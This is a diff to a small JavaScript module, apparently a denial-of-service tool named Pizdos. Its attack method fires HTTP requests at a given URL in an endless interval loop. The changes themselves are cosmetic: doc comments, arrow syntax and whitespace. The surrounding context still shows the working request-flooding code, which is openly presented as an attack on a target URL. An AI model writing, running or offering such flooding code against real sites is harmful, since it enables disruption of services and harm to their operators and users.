@@ -7,7 +7,8 @@ module.exports = class Pizdos {
     /**
      * Starts attack on url using options.
      * @param {string} url 
-     * @param {Object} options 
+     * @param {object} options
+     * @public
      */
     static attack(url, options) {
         options = Object.assign(this.standardOptions, options)
@@ -15,7 +16,7 @@ module.exports = class Pizdos {
         options.log(`Attack started at ${new Date}.`)
         
         setInterval(() => {
-            request(url, (error) => {
+            request(url, error => {
                 if (error) throw 'Attack ended with an error.\n' + error
             })
         }, options.frequency)
@@ -29,6 +30,7 @@ module.exports = class Pizdos {
     // Private.
     /**
      * Constant with standard options.
+     * @private
      */
     static get standardOptions() {
         return {
@@ -38,4 +40,3 @@ module.exports = class Pizdos {
         }
     }
 }
- 
